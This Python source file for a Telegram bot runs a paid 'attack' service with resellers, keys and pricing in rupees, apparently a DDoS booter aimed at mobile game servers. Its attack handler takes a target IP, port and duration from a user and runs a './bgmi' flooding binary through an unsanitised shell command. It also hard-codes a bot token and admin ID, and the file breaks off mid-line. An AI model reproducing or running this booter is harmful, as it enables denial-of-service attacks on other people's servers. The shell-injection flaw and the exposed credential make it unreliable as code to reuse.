# START OF CORRECTED pvt.py FILE (v3)

import os
import json
import time
import random
import string
import telebot
import datetime
import calendar
import subprocess
import threading
import asyncio
import logging
from threading import Thread
from telebot import types
from dateutil.relativedelta import relativedelta
import subprocess


# Token is placed directly in the code as requested.
bot = telebot.TeleBot('8192556082:AAGy2H24ojeJHohiOyKg1y1gpRltoldjqEk')

# Admin user IDs
admin_id = {"5906827506"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
BOT_LINK = "@pubg_lite_ka_bot"
escaped_bot_link = BOT_LINK.replace('_', '\\_')

# Per key cost for resellers
KEY_COST = {"1hour": 30, "5hours": 70, "1day": 120, "7days": 600, "1month": 1500}

# In-memory storage
users = {}
keys = {}
last_attack_time = {}

# List of blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001, 10000, 10001, 10002]

# --- DATA HANDLING FUNCTIONS ---
def load_data():
    global users, keys, resellers
    users = read_json_file(USER_FILE)
    keys = read_json_file(KEY_FILE)
    resellers = read_json_file(RESELLERS_FILE)

def read_json_file(filename):
    try:
        with open(filename, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_json_file(data, filename):
    with open(filename, "w") as file:
        json.dump(data, file, indent=4)

def save_users():
    save_json_file(users, USER_FILE)

def save_keys():
    save_json_file(keys, KEY_FILE)
    
def save_resellers(resellers_data):
    save_json_file(resellers_data, RESELLERS_FILE)

# Initialize resellers data
resellers = read_json_file(RESELLERS_FILE)

# --- HELPER FUNCTIONS ---
def create_random_key(length=15):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    custom_key = f"BAAP KA KEY-{random_key}"
    return custom_key

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time
            
def log_command(user_id, target, port, time):
    try:
        user_info = bot.get_chat(user_id)
        username = user_info.username if user_info.username else f"UserID: {user_id}"
        log_entry = f"| ➖ 𝗨𝘀𝗲𝗿𝗡𝗮𝗺𝗲 : @{username}\n | ➖ 𝗧𝗶𝗺𝗲 : {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n"
        log_entry += f" | ➖ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗜𝗣 : {target}\n"
        log_entry += f" | ➖ 𝗧𝗮𝗿𝗴𝗲𝘁 𝗣𝗢𝗥𝗧 : {port}\n"
        log_entry += f" | ➖ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 : {time}\n\n"

        with open(LOG_FILE, "a") as file:
            file.write(log_entry)
    except Exception as e:
        print(f"Error logging command: {e}")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return
    command_parts = message.text.split(' ', 1)
    if len(command_parts) < 2:
        bot.reply_to(message, "Usage: /broadcast <message>", parse_mode='Markdown')
        return
    broadcast_msg = command_parts[1]
    all_users = set(users.keys()) | set(resellers.keys()) | set(admin_id)
    sent_count = 0
    for user in all_users:
        try:
            bot.send_message(user, f"📢 *𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 :*\n\n*{broadcast_msg}*", parse_mode='Markdown')
            sent_count += 1
        except Exception as e:
            print(f"Failed to send broadcast to {user}: {e}")
    bot.reply_to(message, f"➖ *𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝘀𝗲𝗻𝘁 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝘁𝗼 {sent_count} 𝘂𝘀𝗲𝗿𝘀* ! ✅", parse_mode='Markdown')

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "➖ 𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱> <𝗯𝗮𝗹𝗮𝗻𝗰𝗲>")
        return
    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗮𝗺𝗼𝘂𝗻𝘁❗️", parse_mode='Markdown')
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        bot.reply_to(message, f"➖ *𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆* ✅\n\n*𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗨𝘀𝗲𝗿 𝗜𝗗* : {reseller_id}\n*𝗕𝗮𝗹𝗮𝗻𝗰𝗲* : {initial_balance} *𝗥𝘀*\n\n⚡ *𝗣𝗢𝗪𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧 :* ⚡\n\n➖*𝗖𝗛𝗘𝗖𝗞 𝗬𝗢𝗨𝗥 𝗕𝗔𝗟𝗔𝗡𝗖𝗘*   :   `/balance` \n➖*𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗡𝗘𝗪 𝗞𝗘𝗬*   :   `/genkey`", parse_mode='Markdown')
    else:
        bot.reply_to(message, f"➖ *𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗘𝘅𝗶𝘀𝘁 *", parse_mode='Markdown')

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in resellers:
        current_balance = resellers.get(user_id, 0)
        response = f"💰 *𝗬𝗼𝘂𝗿 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗯𝗮𝗹𝗮𝗻𝗰𝗲 𝗶𝘀* : {current_balance} 𝗥𝘀 "
    else:
        response = "⛔️ *𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱 : 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱*"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return
    help_text = """
⚡ *𝗣𝗢𝗪𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:* ⚡
🏦 `/addreseller <user_id> <balance>` - *Empower a new reseller!* 🔥
🔑 `/genkey <duration>` - *Craft a VIP key of destiny!* 🛠️
📜 `/logs` - *Unveil recent logs & secret records!* 📂
👥 `/users` - *Summon the roster of authorized warriors!* ⚔️
❌ `/remove <user_id>` - *Banish a user to the void!* 🚷
🏅 `/resellers` - *Inspect the elite reseller ranks!* 🎖️
💰 `/addbalance <reseller_id> <amount>` - *Bestow wealth upon a reseller!* 💎
🗑️ `/removereseller <reseller_id>` - *Erase a reseller’s existence!* ⚰️
♻️ `/history` - *Check the Key Generation History!*
""" 
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key_prompt(message):
    bot.reply_to(message, "*𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆 :*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()
    if key in keys:
        if user_id in users:
            try:
                current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                if datetime.datetime.now() < current_expiration:
                    bot.reply_to(message, f"❕𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 *𝗮𝗰𝗰𝗲𝘀𝘀*❕", parse_mode='Markdown')
                    return
            except (ValueError, TypeError): 
                del users[user_id]
        duration = keys[key]["duration"]
        if duration == "1hour":
            expiration_time = add_time_to_current_date(hours=1)
        elif duration == "5hours":
            expiration_time = add_time_to_current_date(hours=5)
        elif duration == "1day":
            expiration_time = add_time_to_current_date(days=1)    
        elif duration == "7days":
            expiration_time = add_time_to_current_date(days=7)
        elif duration == "1month":
            expiration_time = add_time_to_current_date(months=1)
        else:
            bot.reply_to(message, "Invalid duration in key.")
            return
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        del keys[key]
        save_keys()
        bot.reply_to(message, f"➖ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 !\n\n𝗲𝘅𝗽𝗶𝗿𝗲𝘀 𝗼𝗻: {users[user_id]}")
    else:
        bot.reply_to(message, "📛 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗼𝗿 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗸𝗲𝘆 📛")

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except Exception as e:
                bot.reply_to(message, f"Could not send logs: {e}")
        else:
            bot.reply_to(message, "No data found")
    else:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    markup.add(attack_button, myinfo_button, redeem_button)
    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 BAAP KA BOT bot !", reply_markup=markup, parse_mode='Markdown')
    bot.send_message(message.chat.id, f"*➖𝗣𝗹𝗲𝗮𝘀𝗲 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝗳𝗿𝗼𝗺 𝗯𝗲𝗹𝗼𝘄 👀* ", parse_mode='Markdown')

COOLDOWN_PERIOD = 60
@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() > expiration_date:
                bot.reply_to(message, "❗️𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱. 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄❗️")
                del users[user_id]
                save_users()
                return
        except (ValueError, TypeError):
            bot.reply_to(message, "Error with your access data. Contact admin.")
            del users[user_id]
            save_users()
            return

        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
                bot.reply_to(message, f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
                return
        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲")
        bot.register_next_step_handler(message, process_attack_details)
    else:
        bot.reply_to(message, "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\n*Oops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!*", parse_mode='Markdown')

def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()
    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            time_duration = int(details[2]) 
            if time_duration > 500:
                bot.reply_to(message, "❗️𝗘𝗿𝗿𝗼𝗿 : 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀 𝘁𝗵𝗲𝗻 500  𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️")
                return
            
            # On Render, you might need to run `chmod +x bgmi` in your build command
            # Build command: `pip install -r requirements.txt; chmod +x bgmi`
            full_command = f"./bgmi {target} {port} {time_duration} 900"
            
            log_command(user_id, target, port, time_duration)
            username = message.from_user.username or "No_username"
            
            subprocess.Popen(full_command, shell=True)
            bot.reply_to(message, f"‼️ 𝗛𝗲𝗹𝗹𝗼 @{username},  𝗬𝗼𝘂𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗼𝗻  {target} : {port} 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗶𝗻 {time_duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 . \n\n𝗣𝗲𝗮𝗰𝗲𝗳𝘂𝗹𝗹𝘆 𝘄𝗮𝗶𝘁 𝗶𝗻 𝗣𝗟𝗔𝗡𝗘  / 𝗟𝗢𝗕𝗕𝗬 𝘄𝗶𝘁𝗵𝗼𝘂𝘁 𝘁𝗼𝘂𝗰𝗵𝗶𝗻𝗴 𝗮𝗻𝘆 𝗕𝘂𝘁𝘁𝗼𝗻 ‼", parse_mode='Markdown')
            
            threading.Timer(time_duration, send_attack_finished_message, [message.chat.id]).start()
            last_attack_time[user_id] = datetime.datetime.now()
        except ValueError:
            bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁.")
        except FileNotFoundError:
            bot.reply_to(message, "Attack script 'bgmi' not found. Contact admin.")
        except Exception as e:
            bot.reply_to(message, f"An error occurred: {e}")
    else:
        bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁. Use: <ip> <port> <time>")

def send_attack_finished_message(chat_id):
    bot.send_message(chat_id, "➖ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱 ! ✅")

@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.from_user.username or "No_username"
    role = "Guest"
    key_expiration = "No active key"
    balance_info = ""

    if user_id in admin_id:
        role = "Admin"
        key_expiration = "Not Applicable"
    elif user_id in resellers:
        role = "Reseller"
        key_expiration = "Not Applicable"
        balance = resellers.get(user_id, 0)
        balance_info = f"💰 *𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘* : {balance} 𝗥𝘀\n"
    elif user_id in users:
        role = "User"
        key_expiration = users.get(user_id, "Error")

    escaped_username = username.replace('_', '\\_')
    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : @{escaped_username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗 : `{user_id}`\n"
        f"🚹 𝗥𝗼𝗹𝗲 : {role}\n"
        f"🕘 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻 : {key_expiration}\n"
        f"{balance_info}"
    )
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return
    if users:
        response = "➖ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗨𝘀𝗲𝗿𝘀 ✅\n\n"
        for user, expiration in users.items():
            response += f" *𝗨𝘀𝗲𝗿 𝗜𝗗 *: `{user}`\n *𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗢𝗻* : {expiration}\n\n"
    else:
        response = "➖ 𝗡𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱."
    bot.reply_to(message, response, parse_mode='Markdown')
    
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /𝗿𝗲𝗺𝗼𝘃𝗲 <𝗨𝘀𝗲𝗿_𝗜𝗗>")
        return
    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        response = f"➖ *𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗿𝗲𝗺𝗼𝘃𝗲𝗱*"
    else:
        response = f"➖ *𝗨𝘀𝗲𝗿 {target_user_id} 𝗶𝘀 𝗻𝗼𝘁 𝗶𝗻 𝘁𝗵𝗲 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗹𝗶𝘀𝘁*"
    bot.reply_to(message, response, parse_mode='Markdown')
    
@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return
    resellers_info = "➖ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 ✅\n\n"
    if resellers:
        for reseller_id, balance in resellers.items():
            try:
                reseller_chat = bot.get_chat(reseller_id)
                reseller_username = f"@{reseller_chat.username}" if reseller_chat.username else "Unknown"
            except Exception:
                reseller_username = "Unknown (Chat not found)"
            resellers_info += (
                f"➖  *𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲* : {reseller_username}\n"
                f"➖  *𝗨𝘀𝗲𝗿𝗜𝗗* : `{reseller_id}`\n"
                f"➖  *𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘* : {balance} Rs\n\n"
            )
    else:
        resellers_info += " ➖ *𝗡𝗼 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲*"
    bot.reply_to(message, resellers_info, parse_mode='Markdown')
       
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "‼️ *𝗢𝗻𝗹𝘆 𝗕𝗼𝗧 𝗢𝗪𝗡𝗲𝗥 𝗖𝗮𝗻 𝗿𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱* ‼️", parse_mode='Markdown')
        return
    try:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "*➖ 𝗨𝘀𝗮𝗴𝗲: /𝗮𝗱𝗱𝗯𝗮𝗹𝗮𝗻𝗰𝗲 <𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿_𝗶𝗱> <𝗮𝗺𝗼𝘂𝗻𝘁>*", parse_mode='Markdown')
            return
        reseller_id = command_parts[1]
        amount = float(command_parts[2])
        if reseller_id not in resellers:
            bot.reply_to(message, "Reseller ID not found.")
            return
        resellers[reseller_id] = resellers.get(reseller_id, 0) + amount
        save_resellers(resellers)
        bot.reply_to(message, f"➖ *𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗔𝗱𝗱𝗲𝗱 !*\n\n𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿'𝘀 𝗨𝘀𝗲𝗿𝗜𝗗 : `{reseller_id}`\n𝗨𝗽𝗱𝗮𝘁𝗲𝗱 𝗡𝗲𝘄 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 : {resellers[reseller_id]} 𝗥𝘀", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "Invalid amount.")

# --- ERROR FIXED IN THIS FUNCTION ---
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "➖ 𝗨𝘀𝗮𝗴𝗲: /𝗴𝗲𝗻𝗸𝗲𝘆 <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻> \n\n⚙️ 𝘼𝙑𝘼𝙄𝙇𝘼𝘽𝙇𝙀 𝙆𝙀𝙔 '𝙨 & 𝘾𝙊𝙎𝙏 : \n     ➖ 𝟭𝗵𝗼𝘂𝗿 : 𝟯𝟬 𝗥𝘀    { `/genkey 1hour` }\n     ➖ 𝟱𝗵𝗼𝘂𝗿𝘀 : 𝟳𝟬 𝗥𝘀    { `/genkey 5hours` }\n     ➖ 𝟭𝗱𝗮𝘆 : 𝟭𝟮𝟬 𝗥𝘀    { `/genkey 1day` }\n     ➖ 𝟳𝗱𝗮𝘆𝘀 : 𝟲𝟬𝟬 𝗥𝘀    { `/genkey 7days` }\n     ➖ 𝟭𝗺𝗼𝗻𝘁𝗵 : 𝟭𝟱𝟬𝟬 𝗥𝘀   { `/genkey 1month` } \n\n                  ‼️  𝗧𝗔𝗣 𝗧𝗢 𝗖𝗢𝗣𝗬  ‼️", parse_mode='Markdown')
        return
    duration = command[1].lower()
    if duration not in KEY_COST:
        bot.reply_to(message, "*❌ Invalid duration specified*", parse_mode='Markdown')
        return
    
    cost = KEY_COST[duration]
    
    if user_id in admin_id:
        key = create_random_key()
        keys[key] = {"duration": duration, "expiration_time": None}
        save_keys()
        username = message.from_user.username or f"UserID:{user_id}"
        with open("key_history.txt", "a") as history_file:
            history_file.write(f"➖ 𝗞𝗘𝗬 : {key}\n➖ 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗 𝗕𝗬 𝗢𝗪𝗡𝗘𝗥 : @{username}\n➖ 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 𝗢𝗙 𝗞𝗘𝗬 : {duration}\n\n")
        response = f"➖ *𝗞𝗘𝗬 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆* ✅\n\n*𝗞𝗘𝗬* : `{key}`\n*𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻* : {duration}\n\n*𝗕𝗼𝘁 𝗟𝗶𝗻𝗸* : {escaped_bot_link}"
    
    elif user_id in resellers:
        # --- SYNTAX ERROR WAS HERE, NOW FIXED ---
        curre